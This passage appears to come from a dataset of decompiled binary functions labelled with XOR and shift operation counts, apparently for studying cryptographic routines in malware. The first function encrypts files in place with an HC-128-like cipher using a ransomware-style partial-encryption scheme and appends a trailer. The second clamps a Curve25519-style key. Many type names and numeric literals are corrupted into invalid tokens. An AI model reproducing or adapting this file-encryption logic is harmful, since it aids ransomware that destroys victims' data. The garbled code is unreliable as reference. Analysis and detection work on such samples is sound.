4; ++n )\n            v99[n] = _mm_load_si128((const __m128i *)((char *)&v104[n + 51] + 12));\n          v42 = 16LL;\n          v43 = v99[0].m128i_i32[0];\n          do\n          {\n            v44 = v96[v42 + 25];\n            v45.QuadPart = (unsigned int)(__ROL4__(v44, 25) ^ __ROL4__(v44, 14));\n            v99[0].m128i_i32[v42] = v42\n                                  + (v45.LowPart ^ (v44 >> 3))\n                                  + (__ROL4__(*((_DWORD *)&v98 + v42 + 2), 15) ^ __ROL4__(\n                                                                                   *((_DWORD *)&v98 + v42 + 2),\n                                                                                   13) ^ (*((_DWORD *)&v98 + v42 + 2) >> 10))\n                                  + *((_DWORD *)&v97 + v42 + 1)\n                                  + v43\n                                  + 256;\n            ++v42;\n            v43 = v44;\n          }\n          while ( v42 != 1024 );\n          v137 = 0;\n          for ( ii = 256LL; ii != 260; ++ii )\n            v99[ii] = _mm_load_si128((const __m128i *)((char *)&v89 + 1 * ii - 1792));\n          for ( jj = 252LL; jj != 256; ++jj )\n            v102[jj + 5] = _mm_load_si128(&v99[jj]);\n          v48 = 64;\n          do\n          {\n            v49 = v137;\n            v11 = v137 & 0x1FF;\n            v50 = (v137 + 16) & 0x1FF;\n            v137 = (v137 + 16) & 0x3FF;\n            if ( v49 > 0x1FF )\n            {\n              v11 = (unsigned int)v11 | 0x200;\n              v66 = (v99[0].m128i_i32[(unsigned __int8)v125]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v125 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[v11] + (__ROL4__(v99[0].m128i_i32[v11 + 1], 23) ^ __ROL4__(v134, 10)) + __ROL4__(v127, 8));\n              v99[0].m128i_i32[v11] = v66;\n              v121 = v66;\n              v67 = (v99[0].m128i_i32[(unsigned __int8)v126]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v126 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[v11 + 1] + (__ROL4__(v99[0].m128i_i32[v11 + 2], 23) ^ __ROL4__(v135, 10)) + __ROL4__(v128, 8));\n              v99[0].m128i_i32[v11 + 1] = v67;\n              v122 = v67;\n              v68 = (v99[0].m128i_i32[(unsigned __int8)v127]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v127 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[v11 + 2] + (__ROL4__(v99[0].m128i_i32[v11 + 3], 23) ^ __ROL4__(v136, 10)) + __ROL4__(v129, 8));\n              v99[0].m128i_i32[v11 + 2] = v68;\n              v123 = v68;\n              v69 = (v99[0].m128i_i32[(unsigned __int8)v128]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v128 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[v11 + 3] + (__ROL4__(*((_DWORD *)&v100 + v11), 23) ^ __ROL4__(v121, 10)) + __ROL4__(v130, 8));\n              v99[0].m128i_i32[v11 + 3] = v69;\n              v124 = v69;\n              v70 = (v99[0].m128i_i32[(unsigned __int8)v129]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v129 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + v11) + (__ROL4__(*((_DWORD *)&v100 + v11 + 1), 23) ^ __ROL4__(v122, 10)) + __ROL4__(v131, 8));\n              *((_DWORD *)&v100 + v11) = v70;\n              v125 = v70;\n              v71 = (v99[0].m128i_i32[(unsigned __int8)v130]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v130 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + v11 + 1) + (__ROL4__(*((_DWORD *)&v100 + v11 + 2), 23) ^ __ROL4__(v123, 10)) + __ROL4__(v132, 8));\n              *((_DWORD *)&v100 + v11 + 1) = v71;\n              v126 = v71;\n              v72 = (v99[0].m128i_i32[(unsigned __int8)v131]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v131 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + v11 + 2) + (__ROL4__(*((_DWORD *)&v100 + v11 + 3), 23) ^ __ROL4__(v124, 10)) + __ROL4__(v133, 8));\n              *((_DWORD *)&v100 + v11 + 2) = v72;\n              v127 = v72;\n              v73 = (v99[0].m128i_i32[(unsigned __int8)v132]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v132 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + v11 + 3) + (__ROL4__(*((_DWORD *)&v102[-1] + v11), 23) ^ __ROL4__(v125, 10)) + __ROL4__(v134, 8));\n              *((_DWORD *)&v100 + v11 + 3) = v73;\n              v128 = v73;\n              v74 = (v99[0].m128i_i32[(unsigned __int8)v133]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v133 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v102[-1] + v11) + (__ROL4__(*((_DWORD *)&v101 + v11 + 1), 23) ^ __ROL4__(v126, 10)) + __ROL4__(v135, 8));\n              *((_DWORD *)&v102[-1] + v11) = v74;\n              v129 = v74;\n              v75 = (v99[0].m128i_i32[(unsigned __int8)v134]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v134 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + v11 + 1) + (__ROL4__(*((_DWORD *)&v101 + v11 + 2), 23) ^ __ROL4__(v127, 10)) + __ROL4__(v136, 8));\n              *((_DWORD *)&v101 + v11 + 1) = v75;\n              v130 = v75;\n              v76 = (v99[0].m128i_i32[(unsigned __int8)v135]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v135 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + v11 + 2) + (__ROL4__(*((_DWORD *)&v101 + v11 + 3), 23) ^ __ROL4__(v128, 10)) + __ROL4__(v121, 8));\n              *((_DWORD *)&v101 + v11 + 2) = v76;\n              v131 = v76;\n              v77 = (v99[0].m128i_i32[(unsigned __int8)v136]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v136 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + v11 + 3) + (__ROL4__(*((_DWORD *)v102 + v11), 23) ^ __ROL4__(v129, 10)) + __ROL4__(v122, 8));\n              *((_DWORD *)&v101 + v11 + 3) = v77;\n              v132 = v77;\n              v78 = (v99[0].m128i_i32[(unsigned __int8)v121]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v121 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + v11) + (__ROL4__(*((_DWORD *)v102 + v11 + 1), 23) ^ __ROL4__(v130, 10)) + __ROL4__(v123, 8));\n              *((_DWORD *)v102 + v11) = v78;\n              v133 = v78;\n              v79 = (v99[0].m128i_i32[(unsigned __int8)v122]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v122 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + v11 + 1) + (__ROL4__(*((_DWORD *)v102 + v11 + 2), 23) ^ __ROL4__(v131, 10)) + __ROL4__(v124, 8));\n              *((_DWORD *)v102 + v11 + 1) = v79;\n              v134 = v79;\n              v80 = (v99[0].m128i_i32[(unsigned __int8)v123]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v123 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + v11 + 2) + (__ROL4__(*((_DWORD *)v102 + v11 + 3), 23) ^ __ROL4__(v132, 10)) + __ROL4__(v125, 8));\n              *((_DWORD *)v102 + v11 + 2) = v80;\n              v135 = v80;\n              v81 = (v99[0].m128i_i32[(unsigned __int8)v124]\n                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v124 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + v11 + 3) + (__ROL4__(v99[0].m128i_i32[v50 | 0x200], 23) ^ __ROL4__(v133, 10)) + __ROL4__(v126, 8));\n              *((_DWORD *)v102 + v11 + 3) = v81;\n              v136 = v81;\n            }\n            else\n            {\n              v51 = (*((_DWORD *)&v104[115] + (unsigned __int8)v109 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v109 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[(unsigned int)v11] + (__ROL4__(v99[0].m128i_i32[v11 + 1], 9) ^ __ROL4__(v118, 22)) + __ROL4__(v111, 24));\n              v99[0].m128i_i32[(unsigned int)v11] = v51;\n              v105 = v51;\n              v52 = (*((_DWORD *)&v104[115] + (unsigned __int8)v110 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v110 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[v11 + 1] + (__ROL4__(v99[0].m128i_i32[(unsigned int)v11 + 2], 9) ^ __ROL4__(LowPart, 22)) + __ROL4__(v112, 24));\n              v99[0].m128i_i32[v11 + 1] = v52;\n              v106 = v52;\n              v53 = (*((_DWORD *)&v104[115] + (unsigned __int8)v111 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v111 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[(unsigned int)v11 + 2] + (__ROL4__(v99[0].m128i_i32[(unsigned int)v11 + 3], 9) ^ __ROL4__(v120, 22)) + __ROL4__(v113, 24));\n              v99[0].m128i_i32[(unsigned int)v11 + 2] = v53;\n              v107 = v53;\n              v54 = (*((_DWORD *)&v104[115] + (unsigned __int8)v112 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v112 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[(unsigned int)v11 + 3] + (__ROL4__(*((_DWORD *)&v100 + (unsigned int)v11), 9) ^ __ROL4__(v105, 22)) + __ROL4__(v114, 24));\n              v99[0].m128i_i32[(unsigned int)v11 + 3] = v54;\n              v108 = v54;\n              v55 = (*((_DWORD *)&v104[115] + (unsigned __int8)v113 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v113 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + (unsigned int)v11) + (__ROL4__(*((_DWORD *)&v100 + (unsigned int)v11 + 1), 9) ^ __ROL4__(v106, 22)) + __ROL4__(v115, 24));\n              *((_DWORD *)&v100 + (unsigned int)v11) = v55;\n              v109 = v55;\n              v56 = (*((_DWORD *)&v104[115] + (unsigned __int8)v114 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v114 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + (unsigned int)v11 + 1) + (__ROL4__(*((_DWORD *)&v100 + (unsigned int)v11 + 2), 9) ^ __ROL4__(v107, 22)) + __ROL4__(v116, 24));\n              *((_DWORD *)&v100 + (unsigned int)v11 + 1) = v56;\n              v110 = v56;\n              v57 = (*((_DWORD *)&v104[115] + (unsigned __int8)v115 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v115 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + (unsigned int)v11 + 2) + (__ROL4__(*((_DWORD *)&v100 + (unsigned int)v11 + 3), 9) ^ __ROL4__(v108, 22)) + __ROL4__(v117, 24));\n              *((_DWORD *)&v100 + (unsigned int)v11 + 2) = v57;\n              v111 = v57;\n              v58 = (*((_DWORD *)&v104[115] + (unsigned __int8)v116 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v116 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + (unsigned int)v11 + 3) + (__ROL4__(*((_DWORD *)&v102[-1] + (unsigned int)v11), 9) ^ __ROL4__(v109, 22)) + __ROL4__(v118, 24));\n              *((_DWORD *)&v100 + (unsigned int)v11 + 3) = v58;\n              v112 = v58;\n              v59 = (*((_DWORD *)&v104[115] + (unsigned __int8)v117 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v117 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v102[-1] + (unsigned int)v11) + (__ROL4__(*((_DWORD *)&v101 + (unsigned int)v11 + 1), 9) ^ __ROL4__(v110, 22)) + __ROL4__(LowPart, 24));\n              *((_DWORD *)&v102[-1] + (unsigned int)v11) = v59;\n              v113 = v59;\n              v60 = (*((_DWORD *)&v104[115] + (unsigned __int8)v118 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v118 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + (unsigned int)v11 + 1) + (__ROL4__(*((_DWORD *)&v101 + (unsigned int)v11 + 2), 9) ^ __ROL4__(v111, 22)) + __ROL4__(v120, 24));\n              *((_DWORD *)&v101 + (unsigned int)v11 + 1) = v60;\n              v114 = v60;\n              v61 = (*((_DWORD *)&v104[115] + (unsigned __int8)LowPart + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)LowPart >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + (unsigned int)v11 + 2) + (__ROL4__(*((_DWORD *)&v101 + (unsigned int)v11 + 3), 9) ^ __ROL4__(v112, 22)) + __ROL4__(v105, 24));\n              *((_DWORD *)&v101 + (unsigned int)v11 + 2) = v61;\n              v115 = v61;\n              v62 = (*((_DWORD *)&v104[115] + (unsigned __int8)v120 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v120 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + (unsigned int)v11 + 3) + (__ROL4__(*((_DWORD *)v102 + (unsigned int)v11), 9) ^ __ROL4__(v113, 22)) + __ROL4__(v106, 24));\n              *((_DWORD *)&v101 + (unsigned int)v11 + 3) = v62;\n              v116 = v62;\n              v63 = (*((_DWORD *)&v104[115] + (unsigned __int8)v105 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v105 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + (unsigned int)v11) + (__ROL4__(*((_DWORD *)v102 + (unsigned int)v11 + 1), 9) ^ __ROL4__(v114, 22)) + __ROL4__(v107, 24));\n              *((_DWORD *)v102 + (unsigned int)v11) = v63;\n              v117 = v63;\n              v64 = (*((_DWORD *)&v104[115] + (unsigned __int8)v106 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v106 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + (unsigned int)v11 + 1) + (__ROL4__(*((_DWORD *)v102 + (unsigned int)v11 + 2), 9) ^ __ROL4__(v115, 22)) + __ROL4__(v108, 24));\n              *((_DWORD *)v102 + (unsigned int)v11 + 1) = v64;\n              v118 = v64;\n              v45.QuadPart = (*((_DWORD *)&v104[115] + (unsigned __int8)v107 + 3)\n                            + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v107 >> 14) & 0x3FC) + 12)) ^ (unsigned int)(*((_DWORD *)v102 + (unsigned int)v11 + 2) + (__ROL4__(*((_DWORD *)v102 + (unsigned int)v11 + 3), 9) ^ __ROL4__(v116, 22)) + __ROL4__(v109, 24));\n              *((_DWORD *)v102 + (unsigned int)v11 + 2) = v45.LowPart;\n              LowPart = v45.LowPart;\n              v65 = (*((_DWORD *)&v104[115] + (unsigned __int8)v108 + 3)\n                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v108 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + (unsigned int)v11 + 3) + (__ROL4__(v99[0].m128i_i32[v50], 9) ^ __ROL4__(v117, 22)) + __ROL4__(v110, 24));\n              *((_DWORD *)v102 + (unsigned int)v11 + 3) = v65;\n              v120 = v65;\n            }\n            --v48;\n          }\n          while ( v48 );\n          v82 = 17C6740724;\n          v83 = 0LL;\n          do\n            v82 = dword_1418E2460[HIE30D(v82) ^ *((unsigned __int8 *)v95 + v83++)] ^ (v82 << 8);\n          while ( (_DWORD)v83 != 64 );\n          v143 = v82;\n          v96[0] = 0;\n          do\n            v138.m128i_i8[v96[0]++] = 0;\n          while ( v96[0] < 0x40u );\n          v96[0] = 0;\n          do\n            *((_BYTE *)v95 + v96[0]++) = 0;\n          while ( v96[0] < 0x40u );\n          v96[0] = 0;\n          do\n            *((_BYTE *)v146 + v96[0]++) = 0;\n          while ( v96[0] < 0x40u );\n          SetFilePointerEx((HA2419)v11, v45, 0LL, (DWORD)FileW);\n          if ( v94 < 20832B21 )\n          {\n            if ( v94 < 529FF41 )\n            {\n              if ( v94 > 0 )\n              {\n                v11 = 0LL;\n                v90 = 0LL;\n                v45.QuadPart = (LO73C5NG)v93;\n                ReadFile(0LL, v93, (DWORD)v20, FileW, (LP5156LACCC4)(unsigned int)(v94 + 4300));\n                sub_14FF03600(0LL, (__int64)v93, v20, v99, v20, v93[0]);\n                SetFilePointerEx(0LL, (LARGE_INAD06R)v93, 0LL, (DWORD)FileW);\n                v90 = 0LL;\n                WriteFile(0LL, v93, (DWORD)v20, FileW, (LP5156LACCC4)v93[0]);\n              }\n            }\n            else\n            {\n              v11 = (unsigned int)v94 / 5uLL;\n              v86 = 3LL;\n              v45.QuadPart = (LO73C5NG)SetFilePointerEx;\n              v87 = 0LL;\n              do\n              {\n                v90 = 0LL;\n                ReadFile((HA2419)v11, SetFilePointerEx, (DWORD)v20, FileW, (LP5156LACCC4)0x10F053);\n                sub_14FF03600(v11, (__int64)SetFilePointerEx, v20, v99, v20, v93[0]);\n                SetFilePointerEx((HA2419)v11, (LARGE_INAD06R)SetFilePointerEx, v87, (DWORD)FileW);\n                v90 = 0LL;\n                WriteFile((HA2419)v11, SetFilePointerEx, (DWORD)v20, FileW, (LP5156LACCC4)v93[0]);\n                v87 = (LARGE_INAD06R *)((char *)v87 + v11);\n                SetFilePointerEx((HA2419)v11, (LARGE_INAD06R)SetFilePointerEx, v87, (DWORD)FileW);\n                --v86;\n              }\n              while ( v86 );\n            }\n          }\n          else\n          {\n            v84 = (unsigned __int64)v94 >> 20;\n            v11 = (unsigned __int64)WriteFile;\n            v45.QuadPart = 0LL;\n            v85 = 0LL;\n            do\n            {\n              v90 = 0LL;\n              ReadFile(WriteFile, (LP87A7)v45.QuadPart, (DWORD)v20, FileW, (LP5156LACCC4)0x10F053);\n              sub_14FF03600((__int64)WriteFile, v45.QuadPart, v20, v99, v20, v93[0]);\n              SetFilePointerEx(WriteFile, v45, (PLAB2E_INAD06R)v45.QuadPart, (DWORD)FileW);\n              v90 = 0LL;\n              WriteFile(WriteFile, (LP1F55D)v45.QuadPart, (DWORD)v20, FileW, (LP5156LACCC4)0x10F053);\n              v45.QuadPart += v84;\n              SetFilePointerEx(WriteFile, v45, (PLAB2E_INAD06R)v45.QuadPart, (DWORD)FileW);\n              ++v85;\n            }\n            while ( v84 != v85 );\n          }\n          v96[0] = 0;\n          do\n            v99[0].m128i_i8[v96[0]++] = 0;\n          while ( v96[0] < 0x10CCu );\n          SetFilePointerEx((HA2419)v11, v45, 0LL, (DWORD)FileW);\n          v90 = 0LL;\n          WriteFile((HA2419)v11, (LP1F55D)v45.QuadPart, (DWORD)v142, FileW, (LP5156LACCC4)0x48);\n          GetProcessHeap();\n          HeapFree((HA2419)v11, v45.LowPart, 0LL);\n        }\n        LO4700D(v15) = CloseHandle((HA2419)v11);\n      }\n    }\n  }\n  return (int)v15;\n}\n// 1456A8A2A: positive sp value 1298 has been found\n// 143C426BC: variable 'v14' is possibly undefined\n// 143C42764: variable 'v18' is possibly undefined\n// 143C427B2: variable 'v21' is possibly undefined\n// 143C427B2: variable 'v22' is possibly undefined\n// 143C427C9: variable 'v23' is possibly undefined\n// 143C427C9: variable 'v24' is possibly undefined\n// 14EC6E3A0: using guessed type __int128 xmmword_14EC6E3A0;\n// 14EC6E3B0: using guessed type __int128 xmmword_14EC6E3B0;\n// 14EC6E430: using guessed type __int128 xmmword_14EC6E430;\n// 14EC6E440: using guessed type __int128 xmmword_14EC6E440;\n// 1418E2460: using guessed type _DWORD dword_1418E2460[1];\n// 14D2D70A0: using guessed type unsigned __int16 word_14D2D70A0[16];\n// 143C42644: using guessed type __m128i anonymous_6[12];\n\n"
    },
    {
        "Function": "sub_1414500C7",
        "Total XOR and shift operations": 84,
        "XOR operations": 2,
        "Shift operations": 82,
        "Operation percentage": "14.58%",
        "Function Body": "\n__int64 __fastcall sub_1414500C7(\n        double a1,\n        double a2,\n        double a3,\n        double a4,\n        double a5,\n        double a6,\n        __m128 a7,\n        __int64 a8,\n        __int64 a9,\n        const __m128i *a10,\n        _WORD *a11,\n        unsigned __int16 *a12)\n{\n  int v12; // eax\n  int v13; // ecx\n  int v14; // edx\n  int v15; // ebp\n  int v16; // ebx\n  int v17; // edx\n  int v18; // ebp\n  int v19; // edx\n  int *v20; // r13\n  int *v21; // r12\n  int *v22; // r15\n  char *v23; // r14\n  char *v24; // rbp\n  int *p_Val; // rsi\n  int *v26; // rbx\n  int *v27; // rdi\n  __int64 v28; // rcx\n  unsigned __int8 v29; // r9\n  int *v30; // r8\n  int v31; // r10d\n  int *v32; // rcx\n  int *v33; // rdx\n  int *v34; // rax\n  __m128i v35; // xmm6\n  __int64 i; // rax\n  __m128i v37; // xmm0\n  __m128i v38; // xmm1\n  __m128i v39; // xmm2\n  __m128i v40; // xmm0\n  __m128i v41; // xmm1\n  __m128i v42; // xmm1\n  __int64 j; // rax\n  __m128i v44; // xmm0\n  __m128i v45; // xmm1\n  __m128i v46; // xmm2\n  __m128i v47; // xmm0\n  __m128i v48; // xmm1\n  __m128i v49; // xmm1\n  unsigned __int64 v50; // rax\n  __int64 k; // rax\n  unsigned __int64 v52; // rax\n  __int64 m; // rax\n  __int64 v54; // rdx\n  __int64 v55; // rdx\n  __int64 v56; // rdx\n  __int64 v57; // rdx\n  unsigned __int64 v58; // rax\n  __int64 n; // rax\n  __int64 v60; // rdx\n  __int64 v61; // rdx\n  __int64 v62; // rdx\n  __int64 v63; // rdx\n  __int64 v64; // rdx\n  __int64 ii; // rax\n  __int64 jj; // rax\n  unsigned __int64 v67; // rax\n  __int64 v68; // rdx\n  __int64 v69; // rdx\n  __int64 kk; // rax\n  __m128i v71; // xmm0\n  __m128i v72; // xmm1\n  __m128i v73; // xmm2\n  __m128i v74; // xmm0\n  __m128i v75; // xmm1\n  __m128i v76; // xmm1\n  __int64 mm; // rax\n  __m128i v78; // xmm0\n  __m128i v79; // xmm1\n  __m128i v80; // xmm2\n  __m128i v81; // xmm0\n  __m128i v82; // xmm1\n  __m128i v83; // xmm1\n  unsigned int i1; // ebx\n  unsigned int i2; // ebx\n  unsigned int i3; // ebx\n  unsigned int i4; // ebx\n  unsigned int i5; // ebx\n  unsigned int i6; // ebx\n  __int64 i7; // rax\n  char v91; // si\n  int v92; // eax\n  __int64 i8; // rbp\n  int v94; // ebx\n  int v95; // ebx\n  int v96; // edx\n  bool v97; // zf\n  int v98; // edx\n  int v99; // eax\n  char v100; // dl\n  __int64 i9; // rbp\n  __int64 v102; // rbx\n  int v103; // ecx\n  int v104; // ecx\n  __int64 i10; // rdx\n  unsigned int v106; // edi\n  int v107; // ebx\n  unsigned int v108; // eax\n  __int64 i11; // rdx\n  __int64 v110; // kr00_8\n  unsigned int v111; // esi\n  unsigned int v112; // r11d\n  __int64 v113; // kr08_8\n  unsigned int v114; // r9d\n  unsigned int v115; // r8d\n  _WORD *v116; // rdi\n  __int16 v117; // eax^2\n  __int64 result; // rax\n  unsigned __int8 v119; // [rsp+2Bh] [rbp-B4Dh]\n  int v120; // [rsp+2Ch] [rbp-B4Ch]\n  __int128 v121[10]; // [rsp+30h] [rbp-B48h] BYREF\n  unsigned int nn; // [rsp+D0h] [rbp-AA8h] BYREF\n  __int64 v123; // [rsp+D4h] [rbp-AA4h]\n  unsigned int v124; // [rsp+DCh] [rbp-A9Ch]\n  unsigned int v125; // [rsp+E0h] [rbp-A98h] BYREF\n  __int16 v126; // [rsp+E4h] [rbp-A94h]\n  __int16 v127; // [rsp+E6h] [rbp-A92h]\n  __int64 v128; // [rsp+E8h] [rbp-A90h]\n  unsigned int v129; // [rsp+F0h] [rbp-A88h]\n  int v130; // [rsp+F4h] [rbp-A84h]\n  _WORD *v131; // [rsp+170h] [rbp-A08h]\n  __int64 v132; // [rsp+178h] [rbp-A00h]\n  __m128i v133; // [rsp+180h] [rbp-9F8h] BYREF\n  __m128i v134; // [rsp+190h] [rbp-9E8h]\n  __int64 v135[10]; // [rsp+1A0h] [rbp-9D8h] BYREF\n  __m128i v136; // [rsp+1F0h] [rbp-988h]\n  __m128i v137; // [rsp+200h] [rbp-978h]\n  int v138[20]; // [rsp+210h] [rbp-968h] BYREF\n  __int128 v139[10]; // [rsp+260h] [rbp-918h] BYREF\n  __int64 v140[20]; // [rsp+300h] [rbp-878h] BYREF\n  __int128 v141[5]; // [rsp+3A0h] [rbp-7D8h] BYREF\n  int v142[40]; // [rsp+3F0h] [rbp-788h] BYREF\n  int v143[40]; // [rsp+490h] [rbp-6E8h] BYREF\n  __int128 v144[10]; // [rsp+530h] [rbp-648h] BYREF\n  __int64 v145[10]; // [rsp+5D0h] [rbp-5A8h] BYREF\n  int v146[40]; // [rsp+620h] [rbp-558h] BYREF\n  int v147[40]; // [rsp+6C0h] [rbp-4B8h] BYREF\n  int v148[40]; // [rsp+760h] [rbp-418h] BYREF\n  __int64 v149; // [rsp+800h] [rbp-378h] BYREF\n  char v150; // [rsp+8A0h] [rbp-2D8h] BYREF\n  __int64 Val; // [rsp+940h] [rbp-238h] BYREF\n  char v152; // [rsp+9E0h] [rbp-198h] BYREF\n  char v153; // [rsp+A80h] [rbp-F8h] BYREF\n  __m128 v154; // [rsp+B20h] [rbp-58h]\n\n  v154 = a7;\n  v131 = a11;\n  v133 = _mm_loadu_si128(a10);\n  v134 = _mm_loadu_si128(a10 + 1);\n  v136 = v133;\n  v133.m128i_i8[0] &= 0xF8u;\n  v137 = v134;\n  v134.m128i_i8[15] = v134.m128i_i8[15] & 0x3F | 0x40;\n  v12 = *((unsigned __int8 *)a12 + 3);\n  v135[0] = *a12 | ((unsigned __int64)*((unsigned __int8 *)a12 + 2) << 16) | ((unsigned __int64)(*((_BYTE *)a12 + 3) & 3) << 24);\n  v13 = *((unsigned __int8 *)a12 + 6);\n  v135[1] = ((v12 | (*((unsigned __int8 *)a12 + 4) << 8) | (*((unsigned __int8 *)a12 + 5) << 16) | (unsigned int)(v13 << 24)) >> 2) & 0x1F3152F;\n  v14 = *((unsigned __int8 *)a12 + 9);\n  v135[2] = ((v13 | (*((unsigned __int8 *)a12 + 7) << 8) | (*((unsigned __int8 *)a12 + 8) << 16) | (unsigned int)(v14 << 24)) >> 3) & 0x3F1692F;\n  v15 = *((unsigned __int8 *)a12 + 12);\n  v135[3] = ((v14 | (*((unsigned __int8 *)a12 + 10) << 8) | (*((unsigned __int8 *)a12 + 11) << 16) | (unsigned int)(v15 << 24)) >> 5) & 0x1F3152F;\n  v135[4] = (unsigned int)(v15 | (*((unsigned __int8 *)a12 + 13) << 8) | (*((unsigned __int8 *)a12 + 14) << 16) | (*((unsigned __int8 *)a12 + 15) << 24)) >> 6;\n  v16 = *((unsigned __int8 *)a12 + 19);\n  v135[5] = a12[8] | ((unsigned __int64)*((unsigned __int8 *)a12 + 18) << 16) | ((unsigned __int64)(*((_BYTE *)a12 + 19) & 1) << 24);\n  v17 = *((unsigned __int8 *)a12 + 22);\n  v135[6] = ((v16 | (*((unsigned __int8 *)a12 + 20) << 8) | (*((unsigned __int8 *)a12 + 21) << 16) | (unsigned int)(v17 << 24)) >> 1) & 0x3F1692F;\n  v18 = *((unsigned __int8 *)a12 + 25);\n  v135[7] = ((v17 | (*((unsigned __int8 *)a12 + 23) << 8) | (*((unsigned __int8 *)a12 + 24) << 16) | (unsigned int)(v18 << 24)) >> 3) & 0x1F3152F;\n  v19 = *((unsigned __int8 *)a12 + 28);\n  v135[8] = ((v18 | (*((unsigned __int8 *)a12 + 26) << 8) | (*((unsigned __int8 *)a12 + 27) << 16) | (unsigned int)(v19 << 24)) >> 4) & 0x3F1692F;\n  v135[9] = ((unsigned int)(v19 | (*((unsigned __int8 *)a12 + 29) << 8) | (*((unsigned __int8 *)a12 + 30) << 16) | (*((unsigned __int8 *)a12 + 31) << 24)) >> 6) & 0x1F3152F;\n  v20 = v142;\n  v21 = v143;\n  *(_QWORD *)v143 = 1LL;\n  v22 = v148;\n  *(_QWORD *)v148 = 1LL;\n  v23 = &v153;\n  v24 = &v152;\n  p_Val = (int *)&Val;\n  Val = 1LL;\n  v26 = (int *)&v150;\n  v27 = (int *)&v149;\n  v149 = 1LL;\n  LO4700D(v121[0]) = 0;\n  do\n  {\n    *((_BYTE *)v142 + SLO4700D(v121[0])) = *((_BYTE *)v135 + SLO4700D(v121[0]));\n    ++LO4700D(v121[0]);\n  }\n  while ( LO4700D(v121[0]) < 0x50 );\n  v28 = 0LL;\n  do\n  {\n    v132 = v28;\n    v29 = ((_BYTE *)&v133 - v28)[31];\n    v30 = v20;\n    v31 = 0;\n    v32 = v27;\n    v33 = v26;\n    v34 = p_Val;\n    do\n    {\n      v26 = v22;\n      v27 = (int *)v23;\n      p_Val = v21;\n      v20 = (int *)v24;\n      v21 = v34;\n      v22 = v33;\n      v23 = (char *)v32;\n      v24 = (char *)v30;\n      v35 = _mm_shuffle_epi32(_mm_cvtsi32_si128(-(v29 >> 7)), 80);\n      for ( i = 0LL; i != 10; i += 2LL )\n      {\n        v37 = _mm_loadu_si128((const __m128i *)&v26[2 * i]);\n        v38 = _mm_shuffle_epi32(v37, 232);\n        v39 = _mm_loadu_si128((const __m128i *)&v30[2 * i]);\n        v40 = _mm_and_si128(_mm_shuffle_epi32(_mm_xor_si128(v37, v39), 232), v35);\n        v41 = _mm_xor_si128(v38, v40);\n    